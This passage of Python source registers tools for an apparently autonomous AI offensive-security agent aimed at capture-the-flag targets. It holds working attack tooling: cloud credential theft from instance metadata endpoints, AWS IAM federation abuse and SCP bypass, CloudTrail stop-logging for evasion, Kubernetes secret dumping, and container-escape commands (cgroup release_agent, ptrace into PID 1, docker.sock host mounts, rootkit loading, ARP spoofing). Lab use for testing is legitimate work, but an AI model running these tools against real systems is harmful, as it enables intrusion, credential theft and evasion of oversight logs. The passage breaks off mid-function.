    ) -> ToolResult:
        """Retrieve an object from a simple object-storage API (S3-like, MinIO, or custom).

        Given an endpoint that lists objects (e.g. {"objects":["flag.txt","readme.txt"]}),
        tries common retrieval patterns: /{object}, /objects/{object}, /{bucket}/{object},
        ?key={object}, ?object={object}, and POST with JSON body.
        Automatically discovers object names from the root listing if object_name is empty.
        Supports optional access_key/secret_key for authenticated endpoints.
        """
        import asyncio, time, json as _json, re as _re, urllib.parse as _uparse

        start = time.perf_counter()
        results: list[dict] = []

        async def _try_get(url: str, headers: dict | None = None, method: str = "GET", body: str | None = None) -> tuple[int, str]:
            cmd = f"curl -s --max-time 5 -w '\\n%{{http_code}}'"
            if headers:
                for k, v in headers.items():
                    cmd += f" -H '{k}: {v}'"
            if method == "POST":
                cmd += " -X POST"
                if body:
                    cmd += f" -d '{body}'"
            cmd += f" '{url}' 2>&1"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            out = stdout.decode("utf-8", errors="replace")
            lines = out.rsplit("\n", 2)
            status = int(lines[-1].strip()) if lines[-1].strip().isdigit() else 0
            body = "\n".join(lines[:-2]) if status > 0 else out
            return status, body

        # Step 1: if no object_name, fetch root listing to discover objects
        endpoints = [endpoint_url.rstrip("/")]
        buckets = [""]
        objects: list[str] = []
        if object_name:
            objects.append(object_name)
        else:
            status, body = await _try_get(endpoints[0] + "/")
            if 200 <= status < 300:
                # Try parsing as JSON array or object list
                try:
                    data = _json.loads(body)
                    if isinstance(data, list):
                        for item in data:
                            if isinstance(item, str):
                                objects.append(item)
                            elif isinstance(item, dict):
                                for v in item.values():
                                    if isinstance(v, str) and "." in v:
                                        objects.append(v)
                    elif isinstance(data, dict):
                        for key in ("objects", "files", "keys", "contents", "items"):
                            arr = data.get(key, [])
                            if isinstance(arr, list):
                                for item in arr:
                                    if isinstance(item, str):
                                        objects.append(item)
                                    elif isinstance(item, dict):
                                        name = item.get("name") or item.get("key") or item.get("object") or ""
                                        if name:
                                            objects.append(name)
                except (ValueError, TypeError):
                    pass

        # Also try /{filename} directly if not in objects yet (LLM may already know it)
        if not objects:
            objects = ["flag.txt", "flag", "readme.txt", "index.html"]

        # Build headers for authentication
        headers: dict | None = None
        if access_key and secret_key:
            headers = {
                "X-Access-Key": access_key,
                "X-Secret-Key": secret_key,
                "Authorization": f"Bearer {secret_key}",
            }

        # Step 2: try patterns for each object
        tried_statuses: dict[str, int] = {}
        for obj in objects[:6]:  # Limit
            obj_clean = obj.strip()
            patterns = [
                f"/{obj_clean}",
                f"/objects/{obj_clean}",
                f"/files/{obj_clean}",
                f"/download/{obj_clean}",
                f"/get/{obj_clean}",
                f"/data/{obj_clean}",
                f"/?key={_uparse.quote(obj_clean)}",
                f"/?object={_uparse.quote(obj_clean)}",
                f"/?file={_uparse.quote(obj_clean)}",
                f"/?name={_uparse.quote(obj_clean)}",
                f"/api/objects/{obj_clean}",
                f"/v1/objects/{obj_clean}",
                # Extended patterns for broader S3-compatible API coverage
                f"/object/{obj_clean}",
                f"/storage/{obj_clean}",
                f"/?id={_uparse.quote(obj_clean)}",
                f"/?path={_uparse.quote(obj_clean)}",
                f"/api/v1/objects/{obj_clean}",
                f"/api/{obj_clean}",
            ]
            for bucket_hint in buckets[:3]:
                if bucket_hint:
                    patterns.insert(0, f"/{bucket_hint}/{obj_clean}")
                    patterns.append(f"/{bucket_hint}/objects/{obj_clean}")

            for path in patterns:
                url = endpoints[0] + path
                status, body = await _try_get(url, headers=headers)
                tried_statuses[str(status)] = tried_statuses.get(str(status), 0) + 1
                if 200 <= status < 300 and body.strip():
                    # Check for flag
                    flag_m = _re.search(r"flag\{[^}]+\}", body)
                    results.append({
                        "url": url, "status": status,
                        "content": body[:2000],
                        "content_len": len(body),
                        "flag": flag_m.group(0) if flag_m else None,
                    })
                    if results and len(results) >= 1:
                        break  # Found one working pattern
                elif status >= 400:
                    continue

            if results:
                break  # Stop after first successful retrieval

        elapsed = (time.perf_counter() - start) * 1000
        if results:
            summary = _json.dumps(results, ensure_ascii=False)
            return ToolResult(
                tool_name="object_store_get", success=True,
                stdout=summary, stderr="",
                exit_code=0, elapsed_ms=elapsed,
            )
        return ToolResult(
            tool_name="object_store_get", success=False,
            stdout="", stderr=(
                f"No objects retrieved from {endpoint_url}. "
                f"Tried {len(objects[:6])} object(s) across {sum(tried_statuses.values())} requests. "
                f"Status codes: {_json.dumps(tried_statuses)}. "
                f"Try object_store_get with explicit object_name if the API uses a non-standard path."
            ),
            exit_code=1, elapsed_ms=elapsed,
        )

    gateway.register(
        name="object_store_get",
        func=object_store_get,
        description="Retrieve objects from a simple object-storage API (S3-compatible, MinIO, or custom REST API). Use when you see an endpoint returning JSON object listings like {\"objects\":[\"flag.txt\",...]} or array of file names. Accepts endpoint URL, optional object name (leave empty to auto-discover from listing), and optional access_key/secret_key for authentication. Tries many common retrieval patterns automatically. Use this BEFORE aws_cli for simple REST-based object stores.",
        parameters={
            "endpoint_url": {"type": "string", "description": "Base URL of the object store (e.g. 'http://localhost:10671')"},
            "object_name": {"type": "string", "description": "Specific object name to retrieve (e.g. 'flag.txt'). Leave empty to auto-discover from root listing."},
            "access_key": {"type": "string", "description": "Optional access key for authenticated endpoints"},
            "secret_key": {"type": "string", "description": "Optional secret key for authenticated endpoints"},
        },
    )

    # ── AWS Cloud CLI ────────────────────────────────────────────

    gateway.register_shell_tool(
        name="aws_cli",
        command_template="aws {service} {action} {resource} {payload_json} --output json 2>&1",
        description="Execute AWS CLI commands for cloud service exploitation. Supports S3 (s3 ls/cp/sync --no-sign-request), IAM (iam list-roles/get-policy/attach-role-policy/simulate-principal-policy), STS (sts assume-role/get-caller-identity/assume-role-with-web-identity/assume-role-with-saml), KMS (kms decrypt/list-keys), Lambda (lambda list-functions/invoke/create-function), SQS (sqs list-queues/receive-message), DynamoDB (dynamodb list-tables/scan/query), Organizations (organizations describe-organization/list-accounts/list-policies/list-targets-for-policy/describe-policy/detach-policy/disable-policy-type), CloudFormation (cloudformation create-stack/validate-template/describe-stacks), CloudTrail (cloudtrail describe-trails/get-trail-status/get-event-selectors/stop-logging). For LOCAL cloud simulators (not real AWS), add '--endpoint-url http://localhost:PORT' or '--endpoint-url http://127.0.0.1:PORT' in payload_json to target the local service. Automatically uses IMDS credentials when running on EC2. For unauthenticated S3 access, add '--no-sign-request' to payload_json.",
        parameters={
            "service": {"type": "string", "description": "AWS service: s3, iam, sts, kms, lambda, sqs, dynamodb, organizations, cloudformation, cloudtrail. Use 'organizations' for SCP bypass and account enumeration. Use 'cloudformation' for template injection attacks. Use 'cloudtrail' for logging evasion and trail enumeration."},
            "action": {"type": "string", "description": "AWS CLI action: ls, cp, sync, list-roles, get-policy, get-role, attach-role-policy, simulate-principal-policy, assume-role, assume-role-with-web-identity, assume-role-with-saml, get-caller-identity, decrypt, list-functions, invoke, create-function, list-queues, receive-message, list-tables, scan, query, describe-organization, list-accounts, list-policies, list-targets-for-policy, describe-policy, detach-policy, disable-policy-type, create-stack, validate-template, describe-stacks, describe-trails, get-trail-status, get-event-selectors, stop-logging"},
            "resource": {"type": "string", "description": "Resource identifier (e.g., 's3://bucket-name', 'role/role-name', '--function-name NAME', '--queue-url URL', '--table-name NAME'). Leave empty for list operations."},
            "payload_json": {"type": "string", "description": "Additional flags, --query filters, or JSON payload. Examples: '--no-sign-request' (anonymous S3), '--endpoint-url http://localhost:10704' (local cloud simulator), '--role-session-name test', '--max-number-of-messages 10', '--filter-expression \"attribute_exists(flag)\"', '--query \"Buckets[].Name\"'", "default": ""},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── AWS IAM Federation & Cross-Account ─────────────────────────
    async def aws_iam_federation(
        action: str = "assume-role",
        role_arn: str = "",
        source_profile: str = "",
        web_identity_token: str = "",
        saml_assertion: str = "",
        provider_arn: str = "",
        role_session_name: str = "darwin-session",
        endpoint_url: str = "",
        duration_seconds: int = 3600,
    ) -> ToolResult:
        """Execute AWS IAM cross-account AssumeRole, OIDC/SAML federation.

        Supports:
        - Cross-account AssumeRole chaining (role-arn + source creds from IMDS)
        - OIDC federation (AssumeRoleWithWebIdentity with JWT token)
        - SAML federation (AssumeRoleWithSAML with SAML assertion)
        - SCP bypass via Organizations API version manipulation
        - Cross-account S3 access using temporary credentials
        """
        import asyncio, time, os, json as _json

        start = time.perf_counter()
        results: list[dict] = []

        _endpoint = f" --endpoint-url {endpoint_url}" if endpoint_url else ""
        _profile = f" --profile {source_profile}" if source_profile else ""

        try:
            if action == "assume-role":
                if not role_arn:
                    return ToolResult(
                        tool_name="aws_iam_federation", success=False,
                        stdout="", stderr="role_arn required for assume-role", exit_code=1,
                        elapsed_ms=(time.perf_counter() - start) * 1000,
                    )
                cmd = (
                    f"aws sts assume-role --role-arn {role_arn} "
                    f"--role-session-name {role_session_name}"
                    f"{_endpoint}{_profile} --output json 2>&1"
                )
            elif action == "assume-role-with-web-identity":
                if not web_identity_token or not role_arn:
                    return ToolResult(
                        tool_name="aws_iam_federation", success=False,
                        stdout="", stderr="web_identity_token and role_arn required", exit_code=1,
                        elapsed_ms=(time.perf_counter() - start) * 1000,
                    )
                # Save token to temp file
                import tempfile
                with tempfile.NamedTemporaryFile(mode="w", suffix=".jwt", delete=False) as tf:
                    tf.write(web_identity_token)
                    token_file = tf.name
                cmd = (
                    f"aws sts assume-role-with-web-identity --role-arn {role_arn} "
                    f"--role-session-name {role_session_name} --web-identity-token file://{token_file}"
                    f"{_endpoint} --output json 2>&1"
                )
            elif action == "assume-role-with-saml":
                if not saml_assertion or not role_arn or not provider_arn:
                    return ToolResult(
                        tool_name="aws_iam_federation", success=False,
                        stdout="", stderr="saml_assertion, role_arn, and provider_arn required", exit_code=1,
                        elapsed_ms=(time.perf_counter() - start) * 1000,
                    )
                cmd = (
                    f"aws sts assume-role-with-saml --role-arn {role_arn} "
                    f"--principal-arn {provider_arn} --saml-assertion '{saml_assertion}'"
                    f"{_endpoint} --output json 2>&1"
                )
            elif action == "enumerate-organizations":
                cmd = (
                    f"aws organizations list-accounts{_endpoint}{_profile} --output json 2>&1; "
                    f"aws organizations list-policies --filter SERVICE_CONTROL_POLICY{_endpoint}{_profile} --output json 2>&1"
                )
            elif action == "scp-evaluate":
                cmd = (
                    f"aws organizations describe-policy --policy-id {role_arn or 'p-xxx'}{_endpoint}{_profile} --output json 2>&1; "
                    f"aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123456789012:role/test "
                    f"--action-names s3:GetObject sts:AssumeRole{_endpoint}{_profile} --output json 2>&1"
                )
            elif action == "cross-account-s3":
                if not role_arn:
                    return ToolResult(
                        tool_name="aws_iam_federation", success=False,
                        stdout="", stderr="role_arn required for cross-account access", exit_code=1,
                        elapsed_ms=(time.perf_counter() - start) * 1000,
                    )
                # First assume the role, then access S3
                assume_cmd = (
                    f"aws sts assume-role --role-arn {role_arn} "
                    f"--role-session-name {role_session_name}{_endpoint}{_profile} --output json 2>&1"
                )
                proc = await asyncio.create_subprocess_shell(
                    assume_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
                    env={**os.environ, "AWS_ACCESS_KEY_ID": os.environ.get("AWS_ACCESS_KEY_ID", ""),
                         "AWS_SECRET_ACCESS_KEY": os.environ.get("AWS_SECRET_ACCESS_KEY", "")}
                )
                assume_out, assume_err = await asyncio.wait_for(proc.communicate(), timeout=30)
                assume_text = assume_out.decode("utf-8", errors="replace")
                try:
                    assume_json = _json.loads(assume_text)
                    temp_creds = assume_json.get("Credentials", {})
                    if temp_creds:
                        _env = {**os.environ,
                                "AWS_ACCESS_KEY_ID": temp_creds.get("AccessKeyId", ""),
                                "AWS_SECRET_ACCESS_KEY": temp_creds.get("SecretAccessKey", ""),
                                "AWS_SESSION_TOKEN": temp_creds.get("SessionToken", "")}
                        s3_cmd = f"aws s3 ls{_endpoint or ' --no-sign-request'} 2>&1"
                        s3_proc = await asyncio.create_subprocess_shell(
                            s3_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=_env)
                        s3_out, s3_err = await asyncio.wait_for(s3_proc.communicate(), timeout=30)
                        results.append({
                            "assume_role": "success",
                            "credentials": {k: v[:20]+"..." for k, v in temp_creds.items()},
                            "s3_access": s3_out.decode("utf-8", errors="replace")[:500],
                        })
                except _json.JSONDecodeError:
                    proc2 = await asyncio.create_subprocess_shell(
                        assume_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                    out2, err2 = await asyncio.wait_for(proc2.communicate(), timeout=30)
                    results.append({"assume_role": "failed", "error": assume_text[:300]})

                return ToolResult(
                    tool_name="aws_iam_federation", success=bool(results),
                    stdout=_json.dumps(results, indent=2), stderr="",
                    exit_code=0, elapsed_ms=(time.perf_counter() - start) * 1000,
                )
            else:
                return ToolResult(
                    tool_name="aws_iam_federation", success=False,
                    stdout="", stderr=f"Unknown action: {action}. Supported: assume-role, assume-role-with-web-identity, assume-role-with-saml, enumerate-organizations, scp-evaluate, cross-account-s3",
                    exit_code=1, elapsed_ms=(time.perf_counter() - start) * 1000,
                )

            if not results:
                proc = await asyncio.create_subprocess_shell(
                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
                stdout_s = stdout.decode("utf-8", errors="replace")
                stderr_s = stderr.decode("utf-8", errors="replace")

                import re
                flag_match = re.search(r'flag\{[^}]+\}', stdout_s)
                elapsed = (time.perf_counter() - start) * 1000

                return ToolResult(
                    tool_name="aws_iam_federation", success=proc.returncode == 0,
                    stdout=f"[{action}]\n{stdout_s[:1000]}",
                    stderr=stderr_s,
                    exit_code=proc.returncode or 0,
                    elapsed_ms=elapsed,
                )
        except Exception as e:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(
                tool_name="aws_iam_federation", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=elapsed,
            )

    gateway.register(
        name="aws_iam_federation",
        func=aws_iam_federation,
        description="Execute AWS IAM cross-account attacks and federation abuse. Supports: cross-account AssumeRole chaining (use when you have credentials from IMDS and want to access another account), OIDC federation (AssumeRoleWithWebIdentity with JWT token — use for CLOUD-11 and OIDC-based attacks), SAML federation (AssumeRoleWithSAML for Golden SAML CLOUD-13), AWS Organizations enumeration (list accounts/policies), SCP bypass evaluation (simulate-principal-policy), and cross-account S3 access with temporary credentials.",
        parameters={
            "action": {"type": "string", "description": "Federation action: assume-role, assume-role-with-web-identity, assume-role-with-saml, enumerate-organizations, scp-evaluate, cross-account-s3"},
            "role_arn": {"type": "string", "description": "Role ARN to assume (e.g. arn:aws:iam::ACCOUNT:role/ROLENAME). Also used as Policy ID for scp-evaluate."},
            "source_profile": {"type": "string", "description": "AWS profile name for source credentials (default: uses env vars from IMDS)"},
            "web_identity_token": {"type": "string", "description": "JWT/OIDC token for AssumeRoleWithWebIdentity (extracted from OIDC provider URL or forged)"},
            "saml_assertion": {"type": "string", "description": "SAML assertion XML for AssumeRoleWithSAML (base64-encoded or raw XML)"},
            "provider_arn": {"type": "string", "description": "SAML/OIDC Identity Provider ARN"},
            "role_session_name": {"type": "string", "description": "Session name for the assumed role session (default: darwin-session)"},
            "endpoint_url": {"type": "string", "description": "Custom endpoint URL for local cloud simulators (e.g. http://localhost:PORT)"},
            "duration_seconds": {"type": "integer", "description": "Session duration in seconds (default: 3600)"},
        },
    )

    # ── AWS STS Query API (direct HTTP — no AWS CLI needed) ──────
    async def aws_sts_query(
        endpoint_url: str,
        action: str,
        access_key_id: str = "",
        secret_access_key: str = "",
        role_arn: str = "",
        role_session_name: str = "darwin",
        api_version: str = "2011-06-15",
        duration_seconds: int = 3600,
        insecure: bool = False,
    ) -> ToolResult:
        """Send AWS STS Query API request directly via HTTP POST.
        Constructs and sends a form-encoded AWS STS API request to an
        STS-compatible endpoint (local simulator or real AWS). No AWS
        CLI required. Parses XML responses and extracts credentials.
        """
        import urllib.request, urllib.parse, ssl, time, re, json as _json
        start = time.perf_counter()

        # Build query string from non-empty parameters
        _qp: list[tuple[str, str]] = []
        if action:
            _qp.append(("Action", action))
        if role_arn:
            _qp.append(("RoleArn", role_arn))
        if access_key_id:
            _qp.append(("AccessKeyId", access_key_id))
        if secret_access_key:
            _qp.append(("SecretAccessKey", secret_access_key))
        if role_session_name:
            _qp.append(("RoleSessionName", role_session_name))
        if api_version:
            _qp.append(("Version", api_version))
        if duration_seconds:
            _qp.append(("DurationSeconds", str(duration_seconds)))

        body = urllib.parse.urlencode(_qp)

        ctx = None
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        raw_body = ""
        content_type = ""
        status = 0
        try:
            req = urllib.request.Request(
                endpoint_url,
                data=body.encode("utf-8"),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            raw_body = resp.read().decode("utf-8", errors="replace")
            content_type = resp.headers.get("Content-Type", "")
            status = resp.status
        except urllib.error.HTTPError as e:
            raw_body = e.read().decode("utf-8", errors="replace")
            content_type = e.headers.get("Content-Type", "")
            status = e.code
        except Exception as e:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(
                tool_name="aws_sts_query", success=False,
                stdout="", stderr=f"Request failed: {e}",
                exit_code=1, elapsed_ms=elapsed,
            )

        elapsed = (time.perf_counter() - start) * 1000
        parts: list[str] = [f"HTTP {status}", f"Sent: {body}"]

        # Parse XML response for credentials
        creds: dict[str, str] = {}
        error_code = None
        error_msg = None
        if "xml" in content_type.lower():
            for tag in ("AccessKeyId", "SecretAccessKey", "SessionToken", "Expiration"):
                m = re.search(rf"<{tag}>([^<]+)</{tag}>", raw_body)
                if m:
                    creds[tag] = m.group(1)
            error_code = re.search(r"<Code>([^<]+)</Code>", raw_body)
            error_msg = re.search(r"<Message>([^<]+)</Message>", raw_body)

        if creds:
            parts.append(f"CREDENTIALS:\n{_json.dumps(creds, indent=2)}")
        elif error_code:
            parts.append(
                f"ERROR: {error_code.group(1)}"
                + (f" - {error_msg.group(1)}" if error_msg else "")
            )

        # Flag detection
        flags_found = re.findall(r"flag\{[^}]+\}", raw_body)
        if flags_found:
            parts.append(f"FLAGS: {', '.join(flags_found)}")

        # Include raw response (truncated)
        _truncated = raw_body[:2000]
        if len(raw_body) > 2000:
            _truncated += f"\n... [truncated {len(raw_body) - 2000} bytes]"
        parts.append(f"\n--- RAW RESPONSE ---\n{_truncated}")

        # 4xx with credentials is still a success (e.g. AssumeRole returns 200)
        # 4xx with error code is a failure
        if status < 400:
            success = True
        elif creds:
            success = True
        else:
            success = False

        return ToolResult(
            tool_name="aws_sts_query",
            success=success,
            stdout="\n".join(parts),
            stderr="" if success else raw_body[:500],
            exit_code=0 if success else 1,
            elapsed_ms=elapsed,
        )

    gateway.register(
        name="aws_sts_query",
        func=aws_sts_query,
        description="Send AWS STS Query API request directly via HTTP POST to an STS-compatible endpoint (local simulator or real AWS). No AWS CLI required. Use for AssumeRole, GetCallerIdentity, GetSessionToken against cloud IAM simulators. Set api_version='2010-05-08' to bypass SCP enforcement via legacy API version. Automatically parses XML credentials from the response. IMPORTANT: RoleArn MUST be the full ARN format (arn:aws:iam::ACCOUNT:role/ROLENAME) — short role names will fail with 'Role not found'.",
        parameters={
            "endpoint_url": {"type": "string", "description": "STS API endpoint URL, e.g. http://127.0.0.1:10702 or http://localhost:PORT"},
            "action": {"type": "string", "description": "STS action: AssumeRole, GetCallerIdentity, GetSessionToken"},
            "access_key_id": {"type": "string", "description": "AWS Access Key ID (from IMDS metadata or known credentials)"},
            "secret_access_key": {"type": "string", "description": "AWS Secret Access Key (from IMDS metadata or known credentials)"},
            "role_arn": {"type": "string", "description": "FULL Role ARN (REQUIRED format: arn:aws:iam::ACCOUNT:role/ROLENAME). Short role names will fail. Get the full ARN from GET /roles endpoint."},
            "role_session_name": {"type": "string", "description": "Session name for assumed role session (default: darwin)"},
            "api_version": {"type": "string", "description": "AWS API version. Use '2010-05-08' to bypass SCP enforcement via legacy API (default: 2011-06-15)"},
            "duration_seconds": {"type": "integer", "description": "Session duration in seconds (default: 3600)"},
            "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
        },
    )

    # ── GCP Cloud CLI ─────────────────────────────────────────────
    gateway.register_shell_tool(
        name="gcloud_cli",
        command_template="gcloud {service} {action} {resource} {flags} --format json 2>&1",
        description="Execute Google Cloud CLI commands. Supports: compute (instances list/describe/disks), storage (gsutil ls/cp), iam (roles list/service-accounts list/service-accounts keys create/get-iam-policy), projects (get-iam-policy/set-iam-policy), kms (keys list/decrypt), functions (list/describe), sql (instances list). Use for GCP IMDS credentials (from check_cloud_metadata) to access GCP services.",
        parameters={
            "service": {"type": "string", "description": "GCP service: compute, storage, iam, projects, kms, functions, sql"},
            "action": {"type": "string", "description": "Action: instances, list, describe, ls, cp, roles, service-accounts, keys, get-iam-policy, set-iam-policy, decrypt"},
            "resource": {"type": "string", "description": "Resource identifier (e.g. instance name, bucket URL gs://bucket, role name, key ring)"},
            "flags": {"type": "string", "description": "Additional flags: --zone, --project, --keyring, --location, --member (default: '')", "default": ""},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    # ── Azure Cloud CLI ───────────────────────────────────────────
    gateway.register_shell_tool(
        name="az_cli",
        command_template="az {service} {action} {resource} {flags} --output json 2>&1",
        description="Execute Azure CLI commands. Supports: vm (list/show), storage (account/blob/container list/show), ad (user/service-principal list), role (assignment list), keyvault (secret list/show), acr (repository list/show), functionapp (list/show). Use with Azure IMDS Managed Identity from check_cloud_metadata. Authenticate via 'az login --identity' for Managed Identity.",
        parameters={
            "service": {"type": "string", "description": "Azure service: vm, storage, ad, role, keyvault, acr, functionapp"},
            "action": {"type": "string", "description": "Action: list, show, download, create, get-policy, set-policy"},
            "resource": {"type": "string", "description": "Resource identifier (e.g. resource group name, storage account name, key vault name)"},
            "flags": {"type": "string", "description": "Additional flags: --resource-group, --account-name, --vault-name, --subscription (default: '')", "default": ""},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Kubernetes Tools ───────────────────────────────────────────

    gateway.register_shell_tool(
        name="kubectl_auth_check",
        command_template="kubectl auth can-i --list --as={sa} -n {namespace} 2>&1",
        description="Check Kubernetes RBAC permissions for a service account in a namespace",
        parameters={"sa": {"type": "string", "description": "Service account name"}, "namespace": {"type": "string", "description": "K8s namespace"}},
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="kubectl_get_secrets",
        command_template="kubectl get secrets -n {namespace} -o json 2>&1 | head -100",
        description="List Kubernetes secrets in a namespace",
        parameters={"namespace": {"type": "string", "description": "K8s namespace"}},
        parser=_parse_shell_output,
        timeout=30,
    )
    async def check_capabilities() -> ToolResult:
        """Check container capabilities and suggest exploitation commands.

        Runs capsh/cap detection, then appends specific exploitation commands
        for each dangerous capability found.
        """
        import asyncio, time, json as _json
        start = time.perf_counter()
        # Run the detection command
        cmd = "capsh --print 2>/dev/null || cat /proc/1/status 2>/dev/null | grep -i cap"
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        stdout_s = stdout.decode("utf-8", errors="replace")
        stderr_s = stderr.decode("utf-8", errors="replace")
        elapsed = (time.perf_counter() - start) * 1000

        # Generate exploitation commands based on detected capabilities
        exploits: list[str] = []
        out_lower = stdout_s.lower()
        if "cap_sys_admin" in out_lower:
            exploits.append(
                "[CAP_SYS_ADMIN] Can mount filesystems and use cgroups.\n"
                "  Exploit: mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgrp /tmp/cgrp && "
                "mkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
                "echo '#!/bin/sh\ncat /root/flag* /host/root/flag* > /tmp/out' > /release_agent && "
                "chmod +x /release_agent && echo '#!/bin/sh\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"' > /trigger && "
                "sh /trigger; cat /tmp/out"
            )
        if "cap_sys_ptrace" in out_lower:
            exploits.append(
                "[CAP_SYS_PTRACE] Can attach to host processes.\n"
                "  Exploit: gdb -p 1 -batch -ex 'call (void)system(\"cat /root/flag*\")'"
            )
        if "cap_dac_read_search" in out_lower:
            exploits.append(
                "[CAP_DAC_READ_SEARCH] Can bypass read permission checks.\n"
                "  Exploit: cat /root/flag* /home/*/flag* 2>/dev/null"
            )
        if "cap_net_raw" in out_lower:
            exploits.append(
                "[CAP_NET_RAW] Can use raw sockets — ARP spoofing possible.\n"
                "  Exploit: arpspoof -i eth0 -t <gateway_ip> <victim_ip>"
            )
        if "cap_sys_module" in out_lower:
            exploits.append(
                "[CAP_SYS_MODULE] Can load kernel modules.\n"
                "  Exploit: insmod /path/to/rootkit.ko"
            )
        if not exploits:
            exploits.append("(no dangerous capabilities with known exploit patterns detected)")

        output = f"{stdout_s}\n\n=== EXPLOITATION COMMANDS ===\n" + "\n\n".join(exploits)
        return ToolResult(
            tool_name="check_capabilities", success=True,
            stdout=output, stderr=stderr_s,
            exit_code=proc.returncode or 0, elapsed_ms=elapsed,
        )

    gateway.register(
        name="check_capabilities",
        func=check_capabilities,
        description="Check container capabilities AND generate exploitation commands for dangerous capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH, CAP_NET_RAW, CAP_SYS_MODULE).",
        parameters={},
    )

    async def check_mounts() -> ToolResult:
        """Check mounted filesystems and suggest container escape commands.

        Runs mount/findmnt detection, then appends specific exploitation commands
        for each dangerous mount found.
        """
        import asyncio, time, json as _json
        start = time.perf_counter()
        cmd = "findmnt -l 2>/dev/null | grep -E '(docker.sock|hostPath|proc|sys|dev)' || mount 2>/dev/null | grep -E '(docker|proc|host)'"
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        stdout_s = stdout.decode("utf-8", errors="replace")
        stderr_s = stderr.decode("utf-8", errors="replace")
        elapsed = (time.perf_counter() - start) * 1000

        exploits: list[str] = []
        out_lower = stdout_s.lower()
        if "docker.sock" in out_lower:
            exploits.append(
                "[DOCKER SOCKET] Can run privileged containers.\n"
                "  Exploit: docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine:latest cat /host/root/flag*"
            )
        if "hostpath" in out_lower or "/host" in out_lower:
            exploits.append(
                "[HOSTPATH MOUNT] Host filesystem exposed.\n"
                "  Exploit: find /host -name 'flag*' -exec cat {} \\; 2>/dev/null"
            )
        if "cri" in out_lower or "containerd" in out_lower:
            exploits.append(
                "[CRI SOCKET] Can run containers via containerd.\n"
                "  Exploit: ctr -n k8s.io run --rm --mount type=bind,src=/,dst=/host,options=rbind:rw alpine host-exploit cat /host/root/flag*"
            )
        if "/proc" in out_lower:
            exploits.append(
                "[PROCFS ACCESS] Host /proc filesystem accessible.\n"
                "  Exploit: cat /proc/1/root/root/flag* 2>/dev/null"
            )
        if not exploits:
            exploits.append("(no dangerous mounts with known exploit patterns detected)")

        output = f"{stdout_s}\n\n=== EXPLOITATION COMMANDS ===\n" + "\n\n".join(exploits)
        return ToolResult(
            tool_name="check_mounts", success=True,
            stdout=output, stderr=stderr_s,
            exit_code=proc.returncode or 0, elapsed_ms=elapsed,
        )

    gateway.register(
        name="check_mounts",
        func=check_mounts,
        description="Check mounted filesystems AND generate exploitation commands for dangerous mounts (docker.sock, hostPath, CRI socket, /proc access, /sys access).",
        parameters={},
    )
    async def check_cloud_metadata() -> ToolResult:
        """Check cloud metadata endpoints for multiple providers.

        Probes AWS, GCP, Azure, Alicloud, and DigitalOcean metadata endpoints.
        Enhanced from original single-AWS probe — now covers all major cloud platforms.
        Extracts instance info, IAM credentials, and service account tokens.
        """
        endpoints = {
            "AWS": "http://169.254.169.254/latest/meta-data/",
            "AWS_IMDSv2": "http://169.254.169.254/latest/api/token",
            "GCP": "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true",
            "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "Alicloud": "http://100.100.100.200/latest/meta-data/",
            "DigitalOcean": "http://169.254.169.254/metadata/v1.json",
        }
        results = []
        import asyncio
        for label, url in endpoints.items():
            extra_headers = ""
            if "GCP" in label:
                extra_headers = "-H 'Metadata-Flavor: Google'"
            elif "Azure" in label:
                extra_headers = "-H 'Metadata: true'"
            elif "AWS_IMDSv2" in label:
                extra_headers = "-X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"

            r = await _run_shell(
                f"curl -sf --connect-timeout 2 {extra_headers} '{url}' 2>/dev/null | head -50",
                timeout=10,
            )
            if r.stdout.strip() and not r.stdout.strip().startswith("curl"):
                results.append(f"[{label}] REACHABLE\n{r.stdout[:2000]}")
            else:
                results.append(f"[{label}] not-reachable")

        # Also try to read IAM credentials from AWS
        iam_r = await _run_shell(
            "ROLE=$(curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -1); "
            "if [ -n \"$ROLE\" ] && [ \"$ROLE\" != 'not-reachable' ]; then "
            "echo \"IAM Role: $ROLE\"; "
            "curl -sf --connect-timeout 2 \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\" 2>/dev/null | head -30; "
            "fi",
            timeout=10,
        )
        if iam_r.stdout.strip():
